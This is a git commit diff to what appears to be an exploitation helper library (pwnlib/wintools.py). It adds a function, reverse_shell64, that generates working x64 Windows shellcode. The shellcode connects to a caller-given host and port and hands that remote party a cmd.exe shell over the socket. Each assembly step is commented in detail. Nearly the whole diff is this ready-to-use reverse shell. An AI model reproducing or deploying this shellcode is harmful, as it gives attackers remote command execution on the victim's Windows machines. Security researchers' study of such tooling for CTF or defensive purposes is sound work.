0d5dc7be155fe5e554dd48bd72f7dd95d6d5dd57
Niklas Baumstark <niklas.baumstark@gmail.com>
2018-05-24 12:04:08 +0200

    add x64 reverse shell

--- pwnlib/wintools.py
+++ pwnlib/wintools.py
@@ -336,3 +336,100 @@ def sendfile32(filename, socket=None):
         WINAPI(ws2_32!send)
         '''.format(socket=socket)
     return resolve32(sc)
+
+
+def reverse_shell64(host, port):
+    ''' tested on Windows 10, RS4 '''
+    port = ((port & 0xff)<<8) | (port >> 8)
+    host = sum(x<<(8*i) for i, x in enumerate(map(int, host.split('.'))))
+
+    sc = r'''
+      push 0
+      mov r14, 'ws2_32'
+      push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
+      mov rcx, rsp           ; set the param for the library to load
+      sub rsp, 0x20 ; shadow
+      WINAPI(kernel32!LoadLibraryA)
+
+      ; perform the call to WSAStartup...
+      sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
+      mov rdx, rsp           ; save pointer to the WSAData structure for WSAStartup call.
+      mov rcx, 0x0101
+      sub rsp, 0x20
+      WINAPI(ws2_32!WSAStartup)
+
+      ; perform the call to WSASocketA...
+      mov rcx, 2
+      mov rdx, 1
+      mov r8, 6
+      mov r9, 0
+      push 0
+      push 0
+      sub rsp, 0x20
+      WINAPI(ws2_32!WSASocketA)
+
+      mov rdi, rax ; RDI = socket
+
+      mov rcx, rdi
+      push 0
+      ;mov r12, 0x0100007F5C110002
+      mov r12, 0x0002 | (PORT << 16) | (HOST << 32)
+      push r12               ; host 127.0.0.1, family AF_INET and port 4444
+      mov rdx, rsp
+      mov r8, 16
+      sub rsp, 0x20
+      WINAPI(ws2_32!connect)
+
+    shell:
+      mov r8, 'cmd'
+      push r8                     ; an extra push for alignment
+      push r8                     ; push our command line: 'cmd',0
+      mov rdx, rsp                ; save a pointer to the command line
+      push rdi                    ; our socket becomes the shells hStdError
+      push rdi                    ; our socket becomes the shells hStdOutput
+      push rdi                    ; our socket becomes the shells hStdInput
+      xor r8, r8                  ; Clear r8 for all the NULL's we need to push
+      push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
+      pop rcx                     ; Set RCX for the loop
+    push_loop:                    ;
+      push r8                     ; push a null qword
+      loop push_loop              ; keep looping untill we have pushed enough nulls
+      mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
+      lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
+      mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
+      mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure
+
+      ; perform the call to CreateProcessA
+      push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
+      push rax                    ; Push the pointer to the STARTUPINFO Structure
+      push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
+      push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
+      push r8                     ; We dont specify any dwCreationFlags
+      inc r8                      ; Increment r8 to be one
+      push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
+      dec r8                      ; Decrement r8 (third param) back down to zero
+      mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
+                                  ; r8 = lpProcessAttributes (NULL)
+                                  ; rdx = the lpCommandLine to point to "cmd",0
+      mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
+      sub rsp, 0x20
+      WINAPI(kernel32!CreateProcessA)
+
+      ; perform the call to WaitForSingleObject
+      xor rdx, rdx
+      dec rdx                     ; Decrement rdx down to -1 (INFINITE)
+      mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
+      sub rsp, 0x20
+      WINAPI(kernel32!WaitForSingleObject)
+
+    bye:
+      mov rcx, 10000
+      WINAPI(kernel32!Sleep)
+      jmp bye
+    '''.replace('PORT', str(port)).replace('HOST', str(host))
+    return resolve64(sc)
+
+code_align_stack64 = r'''
+    and rsp, ~0xf
+    and rbp, ~0xf
+    '''
